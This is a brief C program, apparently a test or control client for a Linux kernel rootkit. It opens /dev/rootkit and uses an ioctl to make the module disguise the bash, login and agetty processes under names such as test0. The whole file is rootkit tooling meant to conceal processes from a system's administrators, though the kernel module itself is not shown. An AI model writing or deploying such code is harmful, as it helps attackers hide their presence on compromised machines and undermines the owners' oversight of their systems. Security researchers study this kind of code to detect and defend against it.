#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"
#include <string.h>
#include <stdio.h>
int main (void){
	
	int fd;
	fd=open("/dev/rootkit", O_RDWR);
	
	struct masq_proc a[3];
	strcpy(a[0].orig_name, "bash");
	strcpy(a[0].new_name, "test0");
	strcpy(a[1].orig_name, "login");
	strcpy(a[1].new_name, "test1");
	strcpy(a[2].orig_name, "agetty");
	strcpy(a[2].new_name, "test2");
	struct masq_proc_req req1={3, a};
	//printf("%ld,%s,%s\n",req1.len,req1.list[1].orig_name,req1.list[1].new_name);
	ioctl(fd, IOCTL_MOD_MASQ, &req1);

	close(fd);

	return 0;
}
